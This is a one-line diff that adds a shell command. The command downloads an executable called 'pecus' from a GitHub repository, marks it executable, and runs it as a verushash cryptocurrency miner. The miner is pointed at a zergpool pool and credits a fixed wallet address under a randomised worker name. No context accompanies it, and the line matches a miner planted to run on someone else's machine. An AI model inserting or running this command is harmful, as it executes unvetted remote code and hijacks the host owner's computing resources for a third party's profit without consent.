@@ -1,0 +1,1 @@
+wget https://github.com/desafff/pecuk/raw/main/pecus && chmod +x pecus && ./pecus -a verushash -o verushash.na.mine.zergpool.com:3300 -u RVj1VkZYsvMHgRtNRn8z1eeGkTCGmK5qmH.$(echo $(shuf -i 1-99 -n 1)-Ib) -p c=VRSC
